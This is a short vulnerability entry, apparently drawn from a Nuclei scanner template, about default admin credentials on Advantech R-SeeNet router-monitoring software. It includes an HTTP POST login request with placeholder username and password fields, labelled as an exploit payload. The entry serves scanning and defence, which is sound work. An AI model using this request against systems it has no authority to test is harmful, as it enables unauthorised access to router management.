# Nuclei Template: Advantech R-SeeNet Default Login
**Template ID:** rseenet-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`rseenet-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Advantech R-SeeNet default admin credentials were discovered. R-SeeNet is a software system used for monitoring of status and functions of Advantech routers.

## Steps to reproduce / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

page=login_change&oper=0&username={{user}}&password={{pass}}&submit=Login
```

## References
- https://icr.advantech.cz/products/software/r-seenet
